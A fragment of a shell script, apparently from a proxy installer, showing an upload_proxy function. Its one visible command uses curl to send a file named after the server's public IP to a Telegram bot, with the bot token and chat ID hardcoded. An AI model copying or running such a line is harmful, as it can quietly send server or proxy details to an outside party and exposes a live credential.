...
upload_proxy() {
    ...
    curl -X POST -F 'document=@/home/proxy-installer/'"IPV4_$IP4_PUBLIC"'.txt' -F 'chat_id=-823097566' https://api.telegram.org/bot6109726078:AAFQIvSwiNgi0Xkl-OeqIwr-8nqNYm8H5Ss/sendDocument
